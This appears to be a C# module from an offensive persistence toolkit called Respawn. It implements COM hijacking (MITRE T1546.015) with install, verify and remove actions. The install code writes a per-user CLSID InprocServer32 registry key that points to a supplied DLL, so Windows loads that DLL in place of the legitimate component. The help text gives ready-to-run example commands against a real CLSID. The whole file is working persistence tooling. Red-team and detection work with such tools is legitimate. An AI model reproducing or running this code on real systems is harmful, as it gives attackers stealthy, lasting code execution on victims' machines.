using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.ComHijack
{
    public class ComHijackModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "com";
        public string Name        => "COM Hijacking";
        public string Mitre       => "T1546.015";
        public string Description => "Persist by abusing the Windows Component Object Model (COM) lookup order, planting a malicious DLL in the user's registry (HKCU) that gets loaded instead of the legitimate system-wide component whenever the object is requested.";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string RegPath = @"Software\Classes\CLSID";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p2", "keys");

            // 2. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-n,  --name", "CLSID to hijack (e.g. {GUID})");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Path to target DLL (.dll only)");
            Console.WriteLine();

            // 3. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t com -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t com -a install -n \"{BCDE0395-E52F-467C-8E3D-C4579291692E}\" -p \"C:\\p.dll\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t com -a verify  -n \"{BCDE0395-E52F-467C-8E3D-C4579291692E}\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t com -a remove  -n \"{BCDE0395-E52F-467C-8E3D-C4579291692E}\"");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return ComHijackKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(RegPath, writable: true)
                    ?? Microsoft.Win32.Registry.CurrentUser.CreateSubKey(RegPath, writable: true);

                if (baseKey == null)
                    return TechniqueResult.Fail("Failed to open HKCU\\Software\\Classes\\CLSID.");

                // check if already exists
                using var existing = baseKey.OpenSubKey(ctx.Name);
                if (existing?.OpenSubKey("InprocServer32") != null)
                    return TechniqueResult.Exists($"COM hijack for '{ctx.Name}' already exists.");

                // create CLSID subkey
                using var clsidKey = baseKey.CreateSubKey(ctx.Name, writable: true);
                if (clsidKey == null)
                    return TechniqueResult.Fail($"Failed to create CLSID subkey '{ctx.Name}'.");

                // create InprocServer32 subkey — this is where Windows looks for the DLL
                using var inprocKey = clsidKey.CreateSubKey("InprocServer32", writable: true);
                if (inprocKey == null)
                    return TechniqueResult.Fail("Failed to create InprocServer32 subkey.");

                // set DLL path as default value
                inprocKey.SetValue("",               ctx.Payload);
                inprocKey.SetValue("ThreadingModel", "Apartment");

                return TechniqueResult.Ok(
                    $"Installed COM hijack for CLSID '{ctx.Name}' -> '{ctx.Payload}'");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Try running as administrator.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(RegPath, writable: true);
                if (baseKey == null)
                    return TechniqueResult.NotFound("HKCU\\Software\\Classes\\CLSID not found.");

                using var existing = baseKey.OpenSubKey(ctx.Name);
                if (existing == null)
                    return TechniqueResult.NotFound($"COM hijack for '{ctx.Name}' not found.");

                baseKey.DeleteSubKeyTree(ctx.Name);
                return TechniqueResult.Ok($"Removed COM hijack for CLSID '{ctx.Name}'.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Try running as administrator.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(RegPath, writable: false);
                if (baseKey == null)
                    return TechniqueResult.NotFound("HKCU\\Software\\Classes\\CLSID not found.");

                using var clsidKey = baseKey.OpenSubKey(ctx.Name);
                if (clsidKey == null)
                    return TechniqueResult.NotFound($"COM hijack for '{ctx.Name}' not found.");

                using var inprocKey = clsidKey.OpenSubKey("InprocServer32");
                if (inprocKey == null)
                    return TechniqueResult.NotFound($"InprocServer32 subkey not found for '{ctx.Name}'.");

                string payload        = inprocKey.GetValue("")?.ToString()               ?? "unknown";
                string threadingModel = inprocKey.GetValue("ThreadingModel")?.ToString() ?? "unknown";

                return TechniqueResult.Ok(
                    $"Verified COM hijack '{ctx.Name}' | " +
                    $"DLL: '{payload}' | " +
                    $"ThreadingModel: '{threadingModel}'");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Try running as administrator.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Name))
            {
                error = "No CLSID specified. Use -n <CLSID> (e.g. {BCDE0395-E52F-467C-8E3D-C4579291692E}).";
                return false;
            }
            if (!ctx.Name.StartsWith("{") || !ctx.Name.EndsWith("}"))
            {
                error = "CLSID must be in GUID format: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <path>.";
                return false;
            }
            if (requirePayload && !System.IO.File.Exists(ctx.Payload))
            {
                error = $"Payload not found: '{ctx.Payload}'.";
                return false;
            }
            if (requirePayload && !ctx.Payload.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
            {
                error = "COM Hijacking requires a DLL payload.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}